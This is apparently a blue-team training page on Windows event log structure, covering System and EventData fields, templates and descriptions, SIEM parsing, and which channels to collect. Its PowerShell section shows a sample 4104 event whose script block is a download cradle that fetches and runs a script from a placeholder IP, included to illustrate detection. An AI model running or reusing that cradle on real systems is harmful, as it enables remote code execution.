---
title: "Inside a Windows Event — System vs EventData, Templates and Descriptions, and the Channels Worth Collecting"
tags:
  - training
  - blue-team
  - windows
  - logging
  - event-logs
---

# Inside a Windows Event — System vs EventData, Templates and Descriptions, and the Channels Worth Collecting { #event-structure-channels }

!!! abstract "What this page covers"
    The previous page followed an event from the program that wrote it to the `.evtx` file. This page opens a single event and takes it apart. Every Windows event has two halves: the **System** part, whose fields are the same for every event on every machine, and the **EventData** (or **UserData**) part, whose fields are chosen by the program that wrote it and change from event ID to event ID. You'll read a full 4624 field by field in both halves, see the UserData form in a 1102 "log cleared" event, then use PowerShell to pull a provider's **template** (the list of fields an event will carry) and **description** (the sentence with `%1`, `%2` … slots) and watch them combine into the message shown in Event Viewer — and see exactly why a SIEM should never parse that message with regular expressions. The second half is about **which channels to collect**: beyond Security, System and Application, the PowerShell, Security-Mitigations, Code Integrity, AppLocker, Defender, Firewall and Sysmon channels, plus a few more that matter in real intrusions, with the key event IDs, what attackers do that shows up there, and how to filter the noisy ones. It closes with the four questions you should be able to answer about your own Windows log collection, then practice questions.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs, file names and hashes are invented for illustration (`.example`, documentation and private IPs).

## The 8 key points { #key-points }

1. Every Windows event is XML with **two sections**. **System** holds the same set of fields in every event (provider, event ID, version, level, task, keywords, time, record ID, process/thread, channel, computer). **EventData** — or **UserData** for some events — holds fields the event's author defined, so they differ for every event ID and provider.
2. System answers "**what kind of event, from whom, when, where**". EventData answers "**what exactly happened**" (who logged on, from which IP, which process started with which command line). Detections almost always need both.
3. The System field `Execution ProcessID` is the process that **wrote** the event (for Security, LSASS), not the process the event is about. The process the event is about lives in EventData (`ProcessName`, `NewProcessName` …).
4. Each provider ships a **template** per event ID and **version**: an ordered list of field names and types. You can dump it with `Get-WinEvent -ListProvider`. One event ID can have several versions with different fields, so a parser must never assume a field is always present.
5. Each provider also ships a **description**: the readable sentence with numbered slots. `%1` is the first field of the template, `%2` the second, and so on; `%%1833`-style values are looked up in a message table.
6. **Message = description + EventData values (+ System metadata).** The message is rebuilt each time someone looks at the event, can be localised, may hide fields, and has tabs, dashes and optional lines. Collect the XML fields (or a reliable JSON conversion of them) and treat the message as a convenience for humans.
7. Security, System and Application are the obvious channels, but many modern attacks only show in others: **PowerShell/Operational** (script blocks), **Sysmon/Operational**, **Defender/Operational**, **Security-Mitigations**, **CodeIntegrity/Operational**, **AppLocker**, **Windows Firewall**, and in practice also **TaskScheduler**, **TerminalServices**, **WMI-Activity** and **Bits-Client**. A prevention that blocks something should also *tell* the SOC.
8. Know your own setup: your audit policy and add-ons, any program that logs outside the event system, which channels you collect, and whether your SIEM shows XML fields, the message, or both — and parses them correctly. If you can't answer these, you will miss things without knowing it.

## Two halves of every event { #two-sections }

### The envelope and the letter { #analogy }

Think of a Windows event as a letter in an envelope. The **envelope** is standardised: every envelope in the country has the same boxes — sender, recipient, postmark date, tracking number. A sorting machine can process any envelope without understanding the letter inside. The **letter** is free-form: a bank statement, a birthday card and a tax notice all look completely different, and only someone who knows what kind of letter it is can read it properly.

In Windows, the envelope is the **System** section and the letter is the **EventData** section. Your SIEM can sort, filter and timestamp every event using System alone. To understand what happened, you need EventData — and you need to know which "kind of letter" (provider + event ID + version) you're holding.

### A complete event, as it is really stored { #full-xml }

Here is a successful remote desktop logon recorded on the server `APP-03`, opened in Event Viewer under **Details → XML View**:

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
    <EventID>4624</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2026-11-19T22:41:07.5312406Z" />
    <EventRecordID>883104</EventRecordID>
    <Correlation ActivityID="{6c1e0f52-93a8-4b2e-9d1a-2f7b81c4e0aa}" />
    <Execution ProcessID="788" ThreadID="5120" />
    <Channel>Security</Channel>
    <Computer>APP-03.corp.example</Computer>
    <Security />
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-18</Data>
    <Data Name="SubjectUserName">APP-03$</Data>
    <Data Name="SubjectDomainName">CORP</Data>
    <Data Name="SubjectLogonId">0x3e7</Data>
    <Data Name="TargetUserSid">S-1-5-21-1004336348-1177238915-682003330-2417</Data>
    <Data Name="TargetUserName">a.kim</Data>
    <Data Name="TargetDomainName">CORP</Data>
    <Data Name="TargetLogonId">0x1d4f2a8</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="LogonProcessName">User32 </Data>
    <Data Name="AuthenticationPackageName">Negotiate</Data>
    <Data Name="WorkstationName">APP-03</Data>
    <Data Name="LogonGuid">{b9a4c0de-1f22-7a3e-5d10-6e8f2c9a4b71}</Data>
    <Data Name="TransmittedServices">-</Data>
    <Data Name="LmPackageName">-</Data>
    <Data Name="KeyLength">0</Data>
    <Data Name="ProcessId">0x1a8c</Data>
    <Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data>
    <Data Name="IpAddress">10.20.7.54</Data>
    <Data Name="IpPort">0</Data>
    <Data Name="ImpersonationLevel">%%1833</Data>
    <Data Name="RestrictedAdminMode">%%1843</Data>
    <Data Name="TargetOutboundUserName">-</Data>
    <Data Name="TargetOutboundDomainName">-</Data>
    <Data Name="VirtualAccount">%%1843</Data>
    <Data Name="TargetLinkedLogonId">0x0</Data>
    <Data Name="ElevatedToken">%%1843</Data>
  </EventData>
</Event>
```

The first line, `<Event xmlns="…">`, just says "this is a Windows event in Microsoft's event schema". Then come the two halves.

### The System section, field by field { #system-fields }

These fields exist in every event, from every provider, on every Windows machine. That is what makes them so useful: a SIEM can always rely on them.

- `<Provider Name="Microsoft-Windows-Security-Auditing" Guid="{…}" />` — **who wrote the event**. The name is what Event Viewer shows as "Source"; the GUID is the provider's fixed identity. As the previous page showed, an event ID only means something together with this field.
- `<EventID>4624</EventID>` — **what kind of event**. 4624 = "An account was successfully logged on". It fires on the machine being logged on to, every time a logon session is created — interactive, network, service, RDP, unlock and so on. Attackers care because every use of stolen credentials (pass-the-hash, RDP with a stolen password, lateral movement over SMB) produces one, so 4624 is the backbone of credential-misuse detection (MITRE ATT&CK **T1078** Valid Accounts, **T1021** Remote Services). The logon types are covered on the important-events pages.
- `<Version>2</Version>` — **which version of this event's template** was used. Microsoft added fields to 4624 over time (version 0 on old systems, more fields in versions 1 and 2). Your parser should read the version, because the fields that exist depend on it.
- `<Level>0</Level>` — severity. Security audit events are always 0 ("LogAlways"), success or failure.
- `<Task>12544</Task>` — task category number; 12544 is **Logon**.
- `<Opcode>0</Opcode>` — an operation code inside the task (start, stop, info …). For Security events it's almost always 0 ("Info"); for some other providers (for example ETW-style providers that log start/stop pairs) it's meaningful.
- `<Keywords>0x8020000000000000</Keywords>` — a bitmask of tags. `0x8020…` = **Audit Success**, `0x8010…` = **Audit Failure**. This, not Level, is how success and failure differ in Security.
- `<TimeCreated SystemTime="2026-11-19T22:41:07.5312406Z" />` — when the event was written, in **UTC** (the `Z`), to 100-nanosecond precision. Event Viewer's General tab shows local time; mixing the two is a classic timeline mistake. (22:41 UTC on 19 November is 09:41 on 20 November in Canberra.)
- `<EventRecordID>883104</EventRecordID>` — a sequence number per channel on this machine. It always increases; gaps in an exported log can show deleted records. It is not unique across machines, so in a SIEM the unique key is roughly *computer + channel + record ID*.
- `<Correlation ActivityID="{…}" />` — an optional ID that ties together events from one operation. Many Security events leave it empty (`<Correlation />`); some providers (for example parts of the Windows Update and networking stacks) use it so you can group related events.
- `<Execution ProcessID="788" ThreadID="5120" />` — the process and thread that **wrote** the event. For Security that is always **LSASS** (here PID 788), because only the security subsystem writes to Security. **[Correction]** A common mistake is to read this as "the process that logged on" or "the process that ran". It isn't. The process involved in the activity is in EventData (`ProcessName` here, `NewProcessName` in 4688).
- `<Channel>Security</Channel>` — which channel (and so which `.evtx` file) the event went into.
- `<Computer>APP-03.corp.example</Computer>` — the machine that **recorded** the event. For a logon, that's the machine being logged on *to*, not where the user sat. Note the FQDN here; some sources and agents use the short name, which matters when you search by host.
- `<Security />` — the user context of the writer, when a provider records one. Many Security events leave it empty; others fill it with an attribute such as `<Security UserID="S-1-5-21-…" />`, which tells you which account caused the event (common in System and Application channel events such as service installs).

### The EventData section, field by field { #eventdata-fields }

These fields were defined by the author of event 4624, version 2. A different event ID has completely different fields.

- `SubjectUserSid S-1-5-18`, `SubjectUserName APP-03$`, `SubjectDomainName CORP`, `SubjectLogonId 0x3e7` — the **subject**: the account that *asked for* the logon on the user's behalf. `S-1-5-18` is the well-known SID of **SYSTEM**, the computer account `APP-03$` acts as SYSTEM, and logon ID `0x3e7` is always the SYSTEM session. This is normal for a logon handled by the local machine.
- `TargetUserSid …-2417`, `TargetUserName a.kim`, `TargetDomainName CORP` — the **target**: the account that was actually logged on. This is the field you search when you ask "where did this user log on?".
- `TargetLogonId 0x1d4f2a8` — the **logon session ID** created by this logon. It is the most important pivot field in Windows logging: every later event from this session carries the same value — as `SubjectLogonId` in a 4688 process creation, in a 4672 special-privileges event, and in the 4634/4647 logoff. Search for `0x1d4f2a8` and you get everything this RDP session did, until it ended.
- `LogonType 10` — **RemoteInteractive** = Remote Desktop. (2 = interactive at the keyboard, 3 = network, e.g. SMB, 5 = service, 7 = unlock, … — covered in detail later.)
- `LogonProcessName "User32 "` — the logon process that handled it. Notice the **trailing space**: the field is fixed-width in some cases, and on other logons you'll see values cut to eight characters (such as `Negotiat`). **[Caution]** An exact-match rule on `LogonProcessName = "User32"` misses `"User32 "`; trim or use "starts with".
- `AuthenticationPackageName Negotiate` — Negotiate picked Kerberos or NTLM. For network logons you'll more often see `Kerberos` or `NTLM` directly; NTLM where Kerberos would be expected is a lateral-movement and relay hint.
- `WorkstationName APP-03` — the name of the machine the client claims. For RDP this is often the server's own name; don't trust it as the source.
- `LogonGuid {…}` — links this logon to the matching Kerberos ticket events on the domain controller (4769). An all-zero GUID usually means the logon didn't use Kerberos.
- `TransmittedServices -`, `LmPackageName -`, `KeyLength 0` — Kerberos delegation details, and the NTLM version and key length (`NTLM V1` here would be a weak-protocol finding). Dashes mean "not applicable".
- `ProcessId 0x1a8c`, `ProcessName C:\Windows\System32\svchost.exe` — the process that **requested** the logon (here, the Remote Desktop service in an `svchost.exe`). For an interactive logon you'd see `winlogon.exe`; for a network logon often `-`. Unexpected processes here (for example a user-writable path) are worth investigating.
- `IpAddress 10.20.7.54`, `IpPort 0` — **where the logon came from**. This is the source you want for RDP and network logons. `-` or `::1`/`127.0.0.1` means local.
- `ImpersonationLevel %%1833` — not text but a **message-table reference**; `%%1833` renders as "Impersonation". You'll see the meaning only in the rendered message (or by looking the code up).
- `RestrictedAdminMode %%1843` — whether RDP Restricted Admin mode was used (`%%1843` renders as "No"). For non-RDP logons this is `-`.
- `TargetOutboundUserName -`, `TargetOutboundDomainName -` — filled when someone uses `runas /netonly` style "new credentials" logons (type 9), where network access uses different credentials from the local session — a technique worth noticing.
- `VirtualAccount %%1843` — "No": not a virtual service account.
- `TargetLinkedLogonId 0x0` and `ElevatedToken %%1843` — with User Account Control, an administrator gets **two** linked sessions: a filtered one and an elevated one. The linked ID points to the partner session; `ElevatedToken` says whether this session has the full admin token ("Yes" is `%%1842`). An RDP logon by an ordinary user, as here, has no partner and no elevation.

**[Supplement]** Two observations from this walk-through matter for the SIEM. First, several fields contain **codes** (`%%1833`, `0x3e7`, SIDs) that only become words when rendered. Second, the **same name means different things in different events**: `SubjectUserName` is the requester in 4624 but the user who started the process in 4688. Read fields in the context of the event they belong to.

### The UserData form { #userdata }

Some events don't use `<EventData>` with `<Data Name="…">` elements. Instead they carry a **UserData** section with their own XML structure. A well-known example is Security **1102**, "The audit log was cleared":

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Eventlog" Guid="{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}" />
    <EventID>1102</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>104</Task>
    <Opcode>0</Opcode>
    <Keywords>0x4020000000000000</Keywords>
    <TimeCreated SystemTime="2026-11-19T23:02:51.0081127Z" />
    <EventRecordID>883391</EventRecordID>
    <Correlation />
    <Execution ProcessID="1372" ThreadID="6404" />
    <Channel>Security</Channel>
    <Computer>APP-03.corp.example</Computer>
    <Security />
  </System>
  <UserData>
    <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
      <SubjectUserSid>S-1-5-21-1004336348-1177238915-682003330-2417</SubjectUserSid>
      <SubjectUserName>a.kim</SubjectUserName>
      <SubjectDomainName>CORP</SubjectDomainName>
      <SubjectLogonId>0x1d4f2a8</SubjectLogonId>
    </LogFileCleared>
  </UserData>
</Event>
```

- The System part looks just like before — but notice `Provider Name="Microsoft-Windows-Eventlog"`. The log-cleared event is written by the **Event Log service itself**, not by the auditing provider, even though it sits in the Security channel. (It's also why the level is 4 here: different provider, different conventions.) This is a concrete case of "one channel, several providers".
- `Execution ProcessID="1372"` is the Event Log service's `svchost.exe`, not LSASS.
- `<UserData><LogFileCleared xmlns="…">` — instead of a flat list of `<Data Name=…>` items, the fields are child elements of a provider-specific element. A parser that only knows `EventData/Data[@Name]` will see **no fields at all** in this event. Make sure your agent and SIEM handle UserData.
- `SubjectLogonId 0x1d4f2a8` — the same session ID as the RDP logon above. Pivoting on it tells the story: `a.kim` logged on over RDP from 10.20.7.54 at 22:41 UTC, and twenty minutes later the same session cleared the Security log. That's MITRE ATT&CK **T1070.001** (Clear Windows Event Logs) and an alert that should go to a person immediately — attackers clear logs to hide what came before.

**[Supplement]** Some older "classic" events have a third shape: `<EventData>` with `<Data>` elements that have **no names** — just values in order. Events written with `Write-EventLog` (previous page) look like this, as do many third-party Application events. In that case the SIEM sees fields such as `param1`, `param2`, and the message text may be the most useful thing you have.

## Templates: the list of fields an event will contain { #templates }

### Why look at templates at all? { #why-templates }

When you write a detection or a parser, you need to know what fields an event *can* have, not just which ones happened to appear in the sample you looked at. The provider's **template** is the authoritative answer. It's also how you investigate an unfamiliar event from a channel nobody on the team has used before.

### Dumping a template with PowerShell, line by line { #template-commands }

```
PS C:\> Get-WinEvent -ListProvider * -ErrorAction SilentlyContinue | Select-Object Name | Measure-Object

Count    : 1187

PS C:\> Get-WinEvent -ListProvider *PowerShell* | Select-Object Name

Name
----
Microsoft-Windows-PowerShell
Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager
PowerShell
PowerShellCore
```

- `Get-WinEvent -ListProvider *` — lists every provider registered on this machine (here 1,187). `-ErrorAction SilentlyContinue` hides the errors from a few providers whose metadata can't be opened.
- `Select-Object Name | Measure-Object` — keep only the name and count them.
- `-ListProvider *PowerShell*` — wildcards work, which is the quick way to find the exact provider name for a product. Here: the modern Windows PowerShell provider, a DSC sub-provider, the classic `PowerShell` source (which writes to the old "Windows PowerShell" channel) and `PowerShellCore` (PowerShell 7).

Now pick one provider and one event:

```
PS C:\> $provider = Get-WinEvent -ListProvider Microsoft-Windows-Security-Auditing
PS C:\> $provider.Events | Where-Object { $_.Id -eq 4624 } | Select-Object Id, Version | Format-Table

  Id Version
  -- -------
4624       0
4624       1
4624       2
```

- `$provider = Get-WinEvent -ListProvider Microsoft-Windows-Security-Auditing` — loads the provider's metadata (its manifest) into a variable. Nothing is read from the log; this is the *definition* of the events.
- `$provider.Events` — every event this provider can write, each with `Id`, `Version`, `Template`, `Description`, `Level`, `Task` and so on.
- `Where-Object { $_.Id -eq 4624 }` — keep event 4624. `$_` means "the current item".
- The result: **three versions** of 4624. Each has its own template and description. A Windows 7–era host writes version 0, current systems write version 2. This is one more reason the message text is unreliable to parse: which lines it contains depends on the version.

Show the template for the version you care about:

```
PS C:\> ($provider.Events | Where-Object { $_.Id -eq 4624 -and $_.Version -eq 2 }).Template

<template xmlns="http://schemas.microsoft.com/win/2004/08/events">
  <data name="SubjectUserSid" inType="win:SID" outType="xs:string"/>
  <data name="SubjectUserName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="SubjectDomainName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="SubjectLogonId" inType="win:HexInt64" outType="win:HexInt64"/>
  <data name="TargetUserSid" inType="win:SID" outType="xs:string"/>
  <data name="TargetUserName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="TargetDomainName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="TargetLogonId" inType="win:HexInt64" outType="win:HexInt64"/>
  <data name="LogonType" inType="win:UInt32" outType="xs:unsignedInt"/>
  <data name="LogonProcessName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="AuthenticationPackageName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="WorkstationName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="LogonGuid" inType="win:GUID" outType="xs:GUID"/>
  <data name="TransmittedServices" inType="win:UnicodeString" outType="xs:string"/>
  <data name="LmPackageName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="KeyLength" inType="win:UInt32" outType="xs:unsignedInt"/>
  <data name="ProcessId" inType="win:Pointer" outType="win:HexInt64"/>
  <data name="ProcessName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="IpAddress" inType="win:UnicodeString" outType="xs:string"/>
  <data name="IpPort" inType="win:UnicodeString" outType="xs:string"/>
  <data name="ImpersonationLevel" inType="win:UnicodeString" outType="xs:string"/>
  <data name="RestrictedAdminMode" inType="win:UnicodeString" outType="xs:string"/>
  <data name="TargetOutboundUserName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="TargetOutboundDomainName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="VirtualAccount" inType="win:UnicodeString" outType="xs:string"/>
  <data name="TargetLinkedLogonId" inType="win:HexInt64" outType="win:HexInt64"/>
  <data name="ElevatedToken" inType="win:UnicodeString" outType="xs:string"/>
</template>
```

- `-and $_.Version -eq 2` — pick exactly one version so you get one template, not three.
- `.Template` — the template is itself XML: one `<data>` line per field, **in order**. The order is the key to the next step: the first line is field 1, the second is field 2, … the last (`ElevatedToken`) is field 27.
- `name="…"` — the field name that appears as `<Data Name="…">` in the stored event and becomes the field name in your SIEM.
- `inType="win:SID"`, `win:UnicodeString`, `win:HexInt64`, `win:UInt32`, `win:GUID`, `win:Pointer` — how the value is stored in binary. This explains things you've already seen: a SID is stored as binary and *shown* as `S-1-5-…`; `HexInt64` values appear as `0x3e7`; `ProcessId` is a pointer-sized number shown as hex (`0x1a8c`), not decimal like in Task Manager.
- `outType="…"` — how the value should be shown as text.

**[Supplement]** Two other ways to see the same metadata: `wevtutil gp Microsoft-Windows-Security-Auditing /ge:true /gm:true` (get publisher, with events and messages) prints it from `cmd.exe`, and Microsoft's documentation pages for each security event show the same field list with explanations. When the docs and the template disagree, trust the template on the machine you are dealing with.

### Practical use: converting EventData into clean fields { #parse-eventdata }

Because the template gives names to every value, you can turn any event into a clean object without touching the message:

```
PS C:\> $e = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 1
PS C:\> $x = [xml]$e.ToXml()
PS C:\> $x.Event.EventData.Data | Where-Object Name -in 'TargetUserName','LogonType','IpAddress','TargetLogonId' |
>>   Format-Table Name, '#text'

Name           #text
----           -----
TargetUserName a.kim
TargetLogonId  0x1d4f2a8
LogonType      10
IpAddress      10.20.7.54
```

- `Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 1` — the newest 4624.
- `$e.ToXml()` — returns the event's stored XML as a string; `[xml]` turns it into an object you can walk.
- `$x.Event.EventData.Data` — every `<Data>` element; each has a `Name` attribute and its value in `#text`.
- `Where-Object Name -in …` — keep the four fields we want. No regular expression, no dependence on language or version — if the field exists, you get it by name. This is exactly what a good log agent does before it ships the event.

## Descriptions: where the readable message comes from { #descriptions }

The same provider object also holds the **description** — the text the General tab shows. Here is the beginning and some key lines of 4624 version 2's description:

```
PS C:\> ($provider.Events | Where-Object { $_.Id -eq 4624 -and $_.Version -eq 2 }).Description

An account was successfully logged on.

Subject:
	Security ID:		%1
	Account Name:		%2
	Account Domain:		%3
	Logon ID:		%4

Logon Information:
	Logon Type:		%9
	Restricted Admin Mode:	%22
	Virtual Account:		%25
	Elevated Token:		%27

Impersonation Level:		%21

New Logon:
	Security ID:		%5
	Account Name:		%6
	Account Domain:		%7
	Logon ID:		%8
	Linked Logon ID:		%26
	Network Account Name:	%23
	Network Account Domain:	%24
	Logon GUID:		%13

Process Information:
	Process ID:		%17
	Process Name:		%18

Network Information:
	Workstation Name:	%12
	Source Network Address:	%19
	Source Port:		%20

Detailed Authentication Information:
	Logon Process:		%10
	Authentication Package:	%11
	Transited Services:	%14
	Package Name (NTLM only):	%15
	Key Length:		%16

This event is generated when a logon session is created. …
```

Read it together with the template:

- `%1` is the **first** `<data>` line of the template (`SubjectUserSid`), `%2` the second (`SubjectUserName`), … `%9` is `LogonType`, `%19` is `IpAddress`, `%27` is `ElevatedToken`.
- The order in the sentence is **not** the order in the template. `Logon Type: %9` appears near the top, `Logon Process: %10` near the bottom. The description author arranged the lines for humans.
- Some labels are friendlier than the field names: the template's `TargetUserName` is shown as "New Logon → Account Name", `IpAddress` as "Source Network Address". If a colleague reads you a value from the General tab, you need this mapping to find the field in the SIEM.
- Values like `%%1833` inside a field are resolved in a second step from the provider's message table: `%%1833` → "Impersonation", `%%1843` → "No", `%%1842` → "Yes". That is why the XML says `%%1843` and the General tab says "No".
- The long paragraph at the end ("This event is generated when …") is static help text added to every single 4624 — one reason messages make events several times larger.

**[Supplement] Rendering also translates SIDs.** In the General tab, `Security ID: %1` with the value `S-1-5-18` is shown as **SYSTEM**, and a domain user's SID as `CORP\a.kim`. Event Viewer looks the SID up *when you view it*. On a machine that can't resolve the domain (for example an offline analysis laptop), you'll see the raw SID instead. The stored data is the SID; the name is a convenience.

## Putting the pieces together { #putting-together }

Three ingredients make the message you see:

```
 System XML               EventData XML                 Provider manifest (on the viewing machine)
 (provider, ID,      +    (values in template order) +  template (field list, version 2)
  version, time …)                                      + description (%1 … %27, %%codes)
          \                         |                              /
           \________________________|_____________________________/
                                    v
                     Rendered "Message" (General tab, Message field)
```

The result for our event:

```
An account was successfully logged on.

Subject:
	Security ID:		SYSTEM
	Account Name:		APP-03$
	Account Domain:		CORP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		10
	Restricted Admin Mode:	No
	Virtual Account:		No
	Elevated Token:		No

Impersonation Level:		Impersonation

New Logon:
	Security ID:		CORP\a.kim
	Account Name:		a.kim
	Account Domain:		CORP
	Logon ID:		0x1D4F2A8
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{b9a4c0de-1f22-7a3e-5d10-6e8f2c9a4b71}

Process Information:
	Process ID:		0x1a8c
	Process Name:		C:\Windows\System32\svchost.exe

Network Information:
	Workstation Name:	APP-03
	Source Network Address:	10.20.7.54
	Source Port:		0

Detailed Authentication Information:
	Logon Process:		User32 
	Authentication Package:	Negotiate
	…
```

Compare it with the XML and you can see every transformation: `%%1843` became "No", `S-1-5-18` became "SYSTEM", `0x3e7` became `0x3E7` (upper case), the System fields (time, computer, keywords) aren't in the text at all — Event Viewer shows them in the box below — and the section headings were added by the description.

### Why the SIEM must not parse the message { #dont-parse-message }

The message is easy for people and terrible for machines. Imagine writing a regular expression to pull the source IP out of it:

```
Source Network Address:\s+(\S+)
```

- `Source Network Address:` — find this English label.
- `\s+` — one or more whitespace characters (the tabs in between).
- `(\S+)` — capture the next run of non-space characters: the IP.

It works on this event, and fails in quieter ways elsewhere: on a host installed in another language the label is translated and nothing matches; in version 0 of 4624 some lines don't exist; in events where a value is empty the line may contain `-`; a field such as `Account Name` appears **twice** (Subject and New Logon), so a naive pattern grabs the wrong one; and `LogonProcessName "User32 "` loses its trailing space. You end up with a parser that is right most of the time — the worst kind, because nobody notices the misses.

Compare what a structured agent sends. Most agents convert the XML fields to JSON one-to-one, for example:

```json
{
  "@timestamp": "2026-11-19T22:41:07.531Z",
  "host": { "name": "APP-03.corp.example" },
  "event": { "code": "4624", "provider": "Microsoft-Windows-Security-Auditing", "outcome": "success" },
  "winlog": {
    "channel": "Security",
    "record_id": 883104,
    "version": 2,
    "process": { "pid": 788 },
    "event_data": {
      "TargetUserName": "a.kim",
      "TargetDomainName": "CORP",
      "TargetLogonId": "0x1d4f2a8",
      "LogonType": "10",
      "IpAddress": "10.20.7.54",
      "AuthenticationPackageName": "Negotiate",
      "ElevatedToken": "%%1843"
    }
  }
}
```

- `@timestamp` — from `TimeCreated`, kept in UTC.
- `host.name`, `event.code`, `event.provider`, `winlog.channel`, `winlog.record_id`, `winlog.version`, `winlog.process.pid` — the System section, in fixed field names every event shares.
- `event.outcome: success` — derived from the Keywords bitmask.
- `winlog.event_data.*` — the EventData fields with their original names. A search for `winlog.event_data.IpAddress:10.20.7.54` works on every host in every language.
- `ElevatedToken "%%1843"` — some agents leave the code unresolved, others translate it to "No". Know which yours does before writing a rule on it.

This JSON layout is an example in the style of common open-source agents; exact field names depend on your product and on whether your SIEM maps them to a common schema. Field normalisation is covered later in the log pipeline section.

## Channels of interest — what to collect { #channels }

### Beyond the big three { #beyond-big-three }

Most organisations start with **Security** (and rightly — it's the most important), then add **System** and **Application**. Those three show logons, process creation (if audited), account and group changes, service installs (System 7045), crashes and many application errors. But a lot of modern attack activity never appears there. Picture a building where cameras cover only the front door, the lift and the car park: you'd catch people walking in, but not what they did in the server room. The other channels are the cameras in the other rooms.

### The channels worth collecting { #channel-table }

| Channel (as shown by `Get-WinEvent -ListLog`) | What is recorded | Key event IDs | Notes |
| --- | --- | --- | --- |
| `Security` | Audit events: logons, process creation, accounts, groups, Kerberos, object access, policy changes | 4624/4625, 4688, 4672, 4720, 4728/4732, 4768/4769, 4719, 1102 | Depends entirely on the audit policy |
| `System` | OS and service events | 7045 (service installed), 7036/7040, 104 (log cleared), 6005/6006 | Many providers in one channel |
| `Application` | Application events | 1000/1001 (crash), app-specific | Mixed quality; legacy EMET wrote here |
| `Microsoft-Windows-PowerShell/Operational` | Pipeline execution, script blocks | 4103, 4104, 4105/4106 | Needs logging enabled by policy |
| `Microsoft-Windows-Security-Mitigations/KernelMode` and `/UserMode` | Exploit-protection blocks and audits | IDs differ per mitigation (block vs audit) | Very valuable when it fires |
| `Microsoft-Windows-CodeIntegrity/Operational` | App Control for Business (WDAC) and driver/image signing decisions | 3076 (audit), 3077 (block), 3033/3063 (signing level) | Use audit mode as a sensor |
| `Microsoft-Windows-AppLocker/EXE and DLL`, `/MSI and Script`, `/Packaged app-Execution`, `/Packaged app-Deployment` | AppLocker allow/audit/block | 8002–8007 (and packaged-app IDs) | One channel per rule collection |
| `Microsoft-Windows-Windows Defender/Operational` | Antivirus detections, actions, tampering | 1116/1117, 1006/1007, 5001, 5007, 5013 | Essential if you don't get Defender alerts centrally |
| `Microsoft-Windows-Windows Firewall With Advanced Security/Firewall` | Firewall rule and profile changes | 2004/2005/2006 (older builds), 2097 and others (newer builds) | Noisy; filter to changes |
| `Microsoft-Windows-Sysmon/Operational` | Sysmon telemetry | 1, 3, 7, 8, 10, 11, 12–14, 22 … | If Sysmon is deployed, always collect |

Now the reasoning behind each one.

**PowerShell/Operational — the most important channel after Security.** Many attacks run entirely in PowerShell, often in memory, downloading code and running it without ever writing an executable to disk. The Security channel sees at most "`powershell.exe` started" (4688), maybe with an encoded command line. The PowerShell channel, with **script block logging** turned on, records the code itself — **after** decoding:

```xml
<System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
  <EventID>4104</EventID>
  <Level>5</Level>
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
  <Computer>WS-FIN-0217.corp.example</Computer>
  <Security UserID="S-1-5-21-1004336348-1177238915-682003330-1871" />
</System>
<EventData>
  <Data Name="MessageNumber">1</Data>
  <Data Name="MessageTotal">1</Data>
  <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/s.ps1')</Data>
  <Data Name="ScriptBlockId">7d0b3f6e-2c41-4a8e-b1f9-0e5a6c2d9b13</Data>
  <Data Name="Path"></Data>
</EventData>
```

- `Provider Microsoft-Windows-PowerShell`, `EventID 4104` — "Creating Scriptblock text": PowerShell logs each block of code it compiles. It fires when script block logging is enabled by policy; PowerShell also logs *suspicious-looking* blocks as warnings even without the policy, but you shouldn't rely on that.
- `Level 5` (Verbose) for normal blocks; suspicious ones are logged at `Level 3` (Warning) — a handy filter.
- `<Security UserID="…-1871" />` — here the System section's `Security` field is filled: the SID of the user whose PowerShell ran the code.
- `MessageNumber 1` / `MessageTotal 1` — long scripts are split over several events; join them by `ScriptBlockId`.
- `ScriptBlockText` — the code itself. This line is a classic **download cradle**: fetch a script from `203.0.113.45` and run it in memory with `IEX` (Invoke-Expression). MITRE ATT&CK **T1059.001** (PowerShell) and **T1105** (Ingress Tool Transfer). Even if the attacker had launched it as `powershell -enc SQBFAFgA…`, 4104 shows the decoded text.
- `Path` empty — the code was typed or passed on the command line, not loaded from a `.ps1` file.

4103 (module logging) records each command run with its parameters; 4105/4106 mark script start/stop when enabled. The details of PowerShell logging belong to the important-events section; what matters here is that **without this channel, a whole class of attacks is invisible**, and many organisations still don't have it enabled. (See also [PowerShell download cradles](../../../adversary/powershell-cradles.md).) PowerShell 7 logs to its own channel, `PowerShellCore/Operational`, so collect both if both are installed.

